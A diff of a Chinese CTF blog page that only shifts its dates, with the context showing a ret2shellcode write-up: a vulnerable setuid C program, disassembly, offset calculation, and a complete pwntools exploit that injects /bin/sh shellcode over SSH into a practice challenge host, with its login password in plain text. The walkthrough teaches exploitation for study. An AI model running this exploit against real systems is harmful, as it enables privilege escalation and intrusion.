@@ -22,27 +22,27 @@
     <meta name="description" content="摘要闲来无事做几个简单的pwn玩玩: ret2shellcode 题目    代码：123456789101112131415161718192021222324252627282930#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int ma">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ret2shellcode">
-<meta property="og:url" content="http://k0rz3n.com/2025/05/11/ret2shellcode/index.html">
+<meta property="og:url" content="http://k0rz3n.com/2025/03/11/ret2shellcode/index.html">
 <meta property="og:site_name" content="K0rz3n&#39;s Blog">
 <meta property="og:description" content="摘要闲来无事做几个简单的pwn玩玩: ret2shellcode 题目    代码：123456789101112131415161718192021222324252627282930#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int ma">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/challenge1.png">
-<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/challenge2.png">
-<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/checksec.png">
-<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/tech1.png">
-<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/static-analysis1.png">
-<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/static-analysis2.png">
-<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/pwn1.png">
-<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/pwn2.png">
-<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/pwn3.png">
-<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/pwn4.png">
-<meta property="og:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/result.png">
-<meta property="article:published_time" content="2025-05-11T16:59:18.000Z">
-<meta property="article:modified_time" content="2025-08-20T13:56:56.383Z">
+<meta property="og:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/challenge1.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/challenge2.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/checksec.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/tech1.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/static-analysis1.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/static-analysis2.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/pwn1.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/pwn2.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/pwn3.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/pwn4.png">
+<meta property="og:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/result.png">
+<meta property="article:published_time" content="2025-03-11T17:59:18.000Z">
+<meta property="article:modified_time" content="2025-08-20T15:18:30.334Z">
 <meta property="article:author" content="K0rz3n">
 <meta property="article:tag" content="二进制  漏洞  CTF">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://k0rz3n.com/2025/05/11/ret2shellcode/challenge1.png">
+<meta name="twitter:image" content="http://k0rz3n.com/2025/03/11/ret2shellcode/challenge1.png">
   
   
   
@@ -227,8 +227,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-05-11 17:59" pubdate>
-          May 11, 2025 pm
+        <time datetime="2025-03-11 17:59" pubdate>
+          March 11, 2025 pm
         </time>
       </span>
     
@@ -293,9 +293,9 @@
               <div class="markdown-body">
                 
                 <h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>闲来无事做几个简单的pwn玩玩: ret2shellcode</p>
-<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/2025/05/11/ret2shellcode/challenge1.png" srcset="/img/loading.gif" lazyload class="">
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/2025/03/11/ret2shellcode/challenge1.png" srcset="/img/loading.gif" lazyload class="">
 
-<img src="/2025/05/11/ret2shellcode/challenge2.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2025/03/11/ret2shellcode/challenge2.png" srcset="/img/loading.gif" lazyload class="">
 
 <h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include &lt;inttypes.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br><br>int main(int argc, char **argv)<br>&#123;<br>    // This prevents /bin/sh from dropping the privileges<br>    setreuid(geteuid(), geteuid());<br><br>        unsigned long int n;<br>        char *endchar;<br>        char buf[64];<br><br>        if (argc != 2)<br>        &#123;<br>                fprintf(stderr, &quot;Please give a number\n&quot;);<br>                return 1;<br>        &#125;<br><br>        /* Convert the user&#x27;s number to an integer */<br>        n = strtoumax(argv[1], &amp;endchar, 10);<br><br>        printf(&quot;buffer is at %p\n&quot;, buf);<br><br>        if (read(STDIN_FILENO, buf, n) == 0)<br>                return 1;<br><br>        return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -304,7 +304,7 @@
 <h2 id="确认系统保护开启状态"><a href="#确认系统保护开启状态" class="headerlink" title="确认系统保护开启状态"></a>确认系统保护开启状态</h2><p>文件下载下来，并使用 checksec 查看，可以看到都是关闭状态</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">scp pwn025@pwn.baectf.com:/home/pwn025/runme ./runme<br>checksec runm<br></code></pre></td></tr></table></figure>
 
-<img src="/2025/05/11/ret2shellcode/checksec.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2025/03/11/ret2shellcode/checksec.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>检查文件平台为 x86-64</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">ubuntu@VM-0-10-ubuntu:~/ctf/stackoverflow/ret2shellcode$ file runme <br>runme: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=49c714829f0e52ddd585916e4ec5d462a4ccee4a, not stripped<br></code></pre></td></tr></table></figure>
@@ -318,14 +318,14 @@
 <li>当程式执行完毕return时，就会被导向错误的内存地址，继续执行我们植入的shellcode。</li>
 </ol>
 <p>简单图解：(关于buffer overflow更详细的原理解释，可以参考<a href="#References">reference</a>中的前两个连结)</p>
-<img src="/2025/05/11/ret2shellcode/tech1.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2025/03/11/ret2shellcode/tech1.png" srcset="/img/loading.gif" lazyload class="">
 
 <h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs plain">pwndbg&gt; disassemble main<br>Dump of assembler code for function main:<br>   0x00000000000011e9 &lt;+0&gt;:     endbr64 <br>   0x00000000000011ed &lt;+4&gt;:     push   rbp<br>   0x00000000000011ee &lt;+5&gt;:     mov    rbp,rsp<br>   0x00000000000011f1 &lt;+8&gt;:     push   rbx<br>   0x00000000000011f2 &lt;+9&gt;:     sub    rsp,0x68<br>   0x00000000000011f6 &lt;+13&gt;:    mov    DWORD PTR [rbp-0x64],edi<br>   0x00000000000011f9 &lt;+16&gt;:    mov    QWORD PTR [rbp-0x70],rsi<br>   0x00000000000011fd &lt;+20&gt;:    call   0x10b0 &lt;geteuid@plt&gt;<br>   0x0000000000001202 &lt;+25&gt;:    mov    ebx,eax<br>   0x0000000000001204 &lt;+27&gt;:    call   0x10b0 &lt;geteuid@plt&gt;<br>   0x0000000000001209 &lt;+32&gt;:    mov    esi,ebx<br>   0x000000000000120b &lt;+34&gt;:    mov    edi,eax<br>   0x000000000000120d &lt;+36&gt;:    call   0x10d0 &lt;setreuid@plt&gt;<br>   0x0000000000001212 &lt;+41&gt;:    cmp    DWORD PTR [rbp-0x64],0x2<br>   0x0000000000001216 &lt;+45&gt;:    je     0x1242 &lt;main+89&gt;<br>   0x0000000000001218 &lt;+47&gt;:    mov    rax,QWORD PTR [rip+0x2e01]        # 0x4020 &lt;stderr@GLIBC_2.2.5&gt;<br>   0x000000000000121f &lt;+54&gt;:    mov    rcx,rax<br>   0x0000000000001222 &lt;+57&gt;:    mov    edx,0x15<br>   0x0000000000001227 &lt;+62&gt;:    mov    esi,0x1<br>   0x000000000000122c &lt;+67&gt;:    lea    rax,[rip+0xdd1]        # 0x2004<br>   0x0000000000001233 &lt;+74&gt;:    mov    rdi,rax<br>   0x0000000000001236 &lt;+77&gt;:    call   0x10f0 &lt;fwrite@plt&gt;<br>   0x000000000000123b &lt;+82&gt;:    mov    eax,0x1<br>   0x0000000000001240 &lt;+87&gt;:    jmp    0x12a6 &lt;main+189&gt;<br>   0x0000000000001242 &lt;+89&gt;:    mov    rax,QWORD PTR [rbp-0x70]<br>   0x0000000000001246 &lt;+93&gt;:    add    rax,0x8<br>   0x000000000000124a &lt;+97&gt;:    mov    rax,QWORD PTR [rax]<br>   0x000000000000124d &lt;+100&gt;:   lea    rcx,[rbp-0x20]<br>   0x0000000000001251 &lt;+104&gt;:   mov    edx,0xa<br>   0x0000000000001256 &lt;+109&gt;:   mov    rsi,rcx<br>   0x0000000000001259 &lt;+112&gt;:   mov    rdi,rax<br>   0x000000000000125c &lt;+115&gt;:   call   0x10e0 &lt;strtoumax@plt&gt;<br>   0x0000000000001261 &lt;+120&gt;:   mov    QWORD PTR [rbp-0x18],rax<br>   0x0000000000001265 &lt;+124&gt;:   lea    rax,[rbp-0x60]<br>   0x0000000000001269 &lt;+128&gt;:   mov    rsi,rax<br>   0x000000000000126c &lt;+131&gt;:   lea    rax,[rip+0xda7]        # 0x201a<br>   0x0000000000001273 &lt;+138&gt;:   mov    rdi,rax<br>   0x0000000000001276 &lt;+141&gt;:   mov    eax,0x0<br>   0x000000000000127b &lt;+146&gt;:   call   0x10a0 &lt;printf@plt&gt;<br>   0x0000000000001280 &lt;+151&gt;:   mov    rdx,QWORD PTR [rbp-0x18]<br>   0x0000000000001284 &lt;+155&gt;:   lea    rax,[rbp-0x60]<br>   0x0000000000001288 &lt;+159&gt;:   mov    rsi,rax<br>   0x000000000000128b &lt;+162&gt;:   mov    edi,0x0<br>   0x0000000000001290 &lt;+167&gt;:   call   0x10c0 &lt;read@plt&gt;<br>   0x0000000000001295 &lt;+172&gt;:   test   rax,rax<br>   0x0000000000001298 &lt;+175&gt;:   jne    0x12a1 &lt;main+184&gt;<br>   0x000000000000129a &lt;+177&gt;:   mov    eax,0x1<br>   0x000000000000129f &lt;+182&gt;:   jmp    0x12a6 &lt;main+189&gt;<br>   0x00000000000012a1 &lt;+184&gt;:   mov    eax,0x0<br>   0x00000000000012a6 &lt;+189&gt;:   mov    rbx,QWORD PTR [rbp-0x8]<br>   0x00000000000012aa &lt;+193&gt;:   leave  <br>   0x00000000000012ab &lt;+194&gt;:   ret    <br>End of assembler dump.<br></code></pre></td></tr></table></figure>
 
 <p>根据 IDA的反编译我们也可以看到  buf 的地址就是这个位置，将buf地址复制给到 rsi 作为函数的第二个参数，使用快捷键B可以看到相对于 ebp 的地址偏移位 60h</p>
-<img src="/2025/05/11/ret2shellcode/static-analysis1.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2025/03/11/ret2shellcode/static-analysis1.png" srcset="/img/loading.gif" lazyload class="">
 
-<img src="/2025/05/11/ret2shellcode/static-analysis2.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2025/03/11/ret2shellcode/static-analysis2.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>根据函数调用的调用范式，我们知道返回地址大概率存在于 rbp+0x8的位置，也就是 buf 和 retrun 的相对距离为 68h, 但是为了确定我们再动态调试进行计算看看是否如我们所料</p>
 <p>我们构造一个超长的payload，让程序崩溃</p>
@@ -344,22 +344,22 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">pop rax<br>jmp rax<br></code></pre></td></tr></table></figure>
 
 <p>而这里的 pop 就是把 rsp 指向的地址的内容 pop出来，这个地址内容就是return的目标地址，因此 rsp 的地址就是 return 地址的存储位置，也就是我们要覆盖的地址空间</p>
-<img src="/2025/05/11/ret2shellcode/pwn1.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2025/03/11/ret2shellcode/pwn1.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>同理我们下断点进行调试，当断点执行到 ret 指令的时候我们查看 rsp 的值，这样我们也能获得到对应的 return 地址所在的地址空间</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">b read //在read 函数下断点<br>run<br>ni<br></code></pre></td></tr></table></figure>
 
-<img src="/2025/05/11/ret2shellcode/pwn2.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2025/03/11/ret2shellcode/pwn2.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>或者使用 pwntools 的 cyclic 生成字符帮我们计算</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">pwndbg&gt; cyclic 200<br>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa<br>// 将字符复制到 payload2.txt 中，并开启调试<br>run 200 &lt; payload2.txt<br></code></pre></td></tr></table></figure>
 
 <p>找到被覆盖的位置，并把覆盖的值输入 cyclic 让他帮我们计算</p>
-<img src="/2025/05/11/ret2shellcode/pwn3.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2025/03/11/ret2shellcode/pwn3.png" srcset="/img/loading.gif" lazyload class="">
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">pwndbg&gt; cyclic -l 0x616161616161616e<br></code></pre></td></tr></table></figure>
 
-<img src="/2025/05/11/ret2shellcode/pwn4.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2025/03/11/ret2shellcode/pwn4.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>可以看到计算的结果 104 就等于我们之前算到的 68h，至此，我们可以分析得出，我们的payload的长度为 68h+8h 字节，接下来我们要分析shellcode</p>
 <p>shellcode 是一段16进制的代码，可以直接注入内存并被直接执行，简单的shellcode目前有现成的平台供我们搜索：<a target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">https://shell-storm.org/shellcode/index.html</a>(shell-storm上有非常多针对不同的作业系统和CPU，执行不同功能的shellcode，我们只要在网站上，根据我们的作业系统及CPU指令集选择合适的shellcode来用即可)， 或者对于我们只需要执行&#x2F;bin&#x2F;sh 我们可以直接使用pwntools 为我们提供的能力</p>
@@ -386,7 +386,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br># 设置连接信息<br>target_ip = &#x27;pwn.baectf.com&#x27;  # 远程主机的 IP 地址<br>target_port = 22  # 默认的 SSH 端口<br>username = &#x27;pwn025&#x27;  # SSH 用户名<br>password = &#x27;butterscotchtopping&#x27;  # SSH 密码<br>executable_path = &#x27;./runme&#x27;  # 可执行文件的路径<br><br># payload 构造<br>shellcode = asm(shellcraft.amd64.linux.sh(), arch=&#x27;amd64&#x27;)<br>payload = shellcode.ljust(104, b&#x27;A&#x27;)+p64(0x7fffffffea40)<br><br><br># 通过 SSH 连接到远程主机<br>p = ssh(host=target_ip, user=username, password=password, port=target_port)<br><br># 在远程主机上执行可执行文件，并传递 payload 作为命令行参数<br>target_program = p.process([executable_path, &#x27;200&#x27;])<br><br>target_program.sendline(payload)<br><br>try:<br>    # 设置超时时间为 5 秒<br>    output = target_program.recv(timeout=5)  # 接收最多 5 秒的输出<br>    print(output.decode())  # 输出接收到的内容<br>except Exception as e:<br>    print(f&quot;Error: &#123;e&#125;&quot;)<br><br># 如果需要进一步交互，可以使用 interactive() 函数进入交互模式<br>target_program.interactive()<br></code></pre></td></tr></table></figure>
 
 
-<img src="/2025/05/11/ret2shellcode/result.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2025/03/11/ret2shellcode/result.png" srcset="/img/loading.gif" lazyload class="">
 
 
 
@@ -442,7 +442,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>ret2shellcode</div>
-      <div>http://k0rz3n.com/2025/05/11/ret2shellcode/</div>
+      <div>http://k0rz3n.com/2025/03/11/ret2shellcode/</div>
     </div>
     <div class="license-meta">
       
@@ -454,7 +454,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>May 11, 2025</div>
+          <div>March 11, 2025</div>
         </div>
       
       
@@ -498,7 +498,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/13/Electric-Vehicle-Charging-Threat-Modeling-on-the-smart-grid/" title="Electric Vehicle Charging Threat Modeling on Smart Grid">
+                      <a href="/2025/05/13/Electric-Vehicle-Charging-Threat-Modeling-on-the-smart-grid/" title="Electric Vehicle Charging Threat Modeling on Smart Grid">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">Electric Vehicle Charging Threat Modeling on Smart Grid</span>
                         <span class="visible-mobile">Previous</span>
@@ -508,7 +508,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/05/10/simple-stackoverflow/" title="Simple Stackoverflow">
+                      <a href="/2025/03/10/simple-stackoverflow/" title="Simple Stackoverflow">
                         <span class="hidden-mobile">Simple Stackoverflow</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
